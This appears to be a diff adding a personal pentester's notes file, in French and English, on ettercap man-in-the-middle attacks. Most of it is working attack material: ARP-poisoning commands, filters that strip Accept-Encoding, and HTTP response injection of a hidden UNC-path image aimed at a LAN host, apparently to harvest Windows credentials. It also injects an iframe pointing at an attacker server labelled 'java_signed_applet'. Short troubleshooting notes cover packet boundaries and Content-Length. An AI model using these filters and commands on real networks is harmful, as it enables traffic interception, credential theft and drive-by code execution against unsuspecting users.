@@ -1,0 +1,51 @@
+# ettercap
+
+# filter
+* old
+pb avec reponse en plusieurs paquets:
+    if (search(DATA.data, "Server: gws")) {
+        replace("/intl/fr/privacy.html", "/intl/fr/pr1v4cy.html");
+ne remplace pas parce que "/intl/fr/privacy.html" est pas dans le meme paquet que l'entete
+
+* injecting UNC path
+cat > blah.ecf <<'EOF'
+if (ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "Accept-Encoding")) {
+    replace("Accept-Encoding", "Accept-Nothingg");
+  }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+  if (search(DATA.data, "</body>")) {
+    msg("body detected");
+pcre_regex(DATA.data, "(?s).{79}</body>", "<!-- --><img src="\\\\192.168.2.6\\b\\l.jpg" alt="" style="width:0px; height:0px"></body>");
+or
+pcre_regex(DATA.data, "(?s).{76}<body>", "<body><img src="\\\\192.168.2.6\\b\\l.jpg" alt="" style="width:0px; height:0px">");
+
+    msg("body injected");
+  }
+}
+EOF
+etterfilter blah.ecf -o blah.ef
+
+* troubleshooting
+etterfilter -t blah.ef
+
+* difficile de maj le Content-Length
+du coup, on peut pas faire replace() avec une chaine plus longue que celle qu'on remplace
+
+# run
+ettercap -i wlan0 -Tq -M arp:remote -F filter.ef /192.168.2.254// /192.168.2.7//
+
+# google + java_signed_applet
+ettercap -M arp:remote -Tq -F etter_iframe.ef /192.168.1.26/ /192.168.1.1/
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Host: www.google.fr")) {
+        replace("Accept-Encoding", "Accept-Nothingg");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("", "<iframe src="http://192.168.1.20:8080/j" ..
+}
+
